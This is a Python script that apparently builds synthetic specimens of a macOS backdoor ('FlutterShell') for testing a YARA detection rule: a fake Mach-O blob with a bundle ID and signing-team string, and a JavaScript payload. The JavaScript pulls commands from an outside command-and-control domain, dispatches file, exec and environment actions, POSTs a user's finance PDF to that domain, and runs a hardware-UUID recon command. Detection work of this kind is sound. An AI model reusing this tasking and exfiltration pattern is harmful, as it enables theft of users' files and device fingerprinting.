#!/usr/bin/env python3
"""
Build FlutterShell specimens:
  specimens/fluttershell.macho  -> synthetic Mach-O with bundle ID + Dev ID
  specimens/webview-payload.js  -> JS payload with flutterInvoke bridge
  specimens/ioc-dump.txt        -> already committed
"""
import os
HERE = os.path.dirname(os.path.abspath(__file__))
SPEC = os.path.join(HERE, "specimens")
os.makedirs(SPEC, exist_ok=True)

# Mach-O fat magic + plist-style bundle ID + Dev ID strings
macho = (
    b"\xCA\xFE\xBA\xBE"            # FAT_MAGIC big-endian
    + b"\x00\x00\x00\x02"           # nfat_arch = 2 (synthetic)
    + b"\x00" * 16
    + b"\x00<plist version=\"1.0\">\n"
    + b"<dict>\n"
    + b"  <key>CFBundleIdentifier</key>\n"
    + b"  <string>com.app.podcastsLounge</string>\n"
    + b"  <key>CFBundleSigningTeam</key>\n"
    + b"  <string>Yasar Sever (UBZDAAV97Y)</string>\n"
    + b"</dict>\n</plist>\n\x00"
)
macho += b"\x00" * (96 * 1024 - len(macho))
with open(os.path.join(SPEC, "fluttershell.macho"), "wb") as f:
    f.write(macho)
print("wrote fluttershell.macho", len(macho), "bytes")

# JS payload mirroring the WebView bridge shape
webview_js = """
// Synthetic FlutterShell WebView JS payload.
// SAFE - no real exec, just shape markers the YARA rule keys on.

window.flutterInvoke = window.flutterInvoke || function(_) { return null; };

async function bootstrap() {
    const cfg = await fetch("https://atsheisdomestic.org/getConfig").then(r => r.json());
    await fetch("https://atsheisdomestic.org/api/update-delay").then(r => r.text());
    const tasks = await fetch("https://atsheisdomestic.org/getUpdateThanksConfig").then(r => r.json());

    for (const t of tasks) {
        if (t.cmd === "exec_sync")  flutterInvoke({cmd: "exec_sync",  args: t.args});
        if (t.cmd === "pdf_sync")   flutterInvoke({cmd: "pdf_sync",   args: t.args});
        if (t.cmd === "renderPDF")  flutterInvoke({cmd: "renderPDF",  args: t.args});
        if (t.cmd === "read_file")  flutterInvoke({cmd: "read_file",  args: t.args});
        if (t.cmd === "write_file") flutterInvoke({cmd: "write_file", args: t.args});
        if (t.cmd === "read_dir")   flutterInvoke({cmd: "read_dir",   args: t.args});
        if (t.cmd === "exists")     flutterInvoke({cmd: "exists",     args: t.args});
        if (t.cmd === "get_home_dir") flutterInvoke({cmd: "get_home_dir", args: t.args});
        if (t.cmd === "get_env")    flutterInvoke({cmd: "get_env",    args: t.args});
    }

    // AI summarisation exfil channel
    const doc = await flutterInvoke({cmd: "read_file", args: "/Users/me/Documents/finance.pdf"});
    await fetch("https://atsheisdomestic.org/summarize-text", {method: "POST", body: doc});

    // recon
    flutterInvoke({cmd: "exec_sync", args: "ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID"});
}

bootstrap();
"""
with open(os.path.join(SPEC, "webview-payload.js"), "w") as f:
    f.write(webview_js)
print("wrote webview-payload.js", len(webview_js), "bytes")
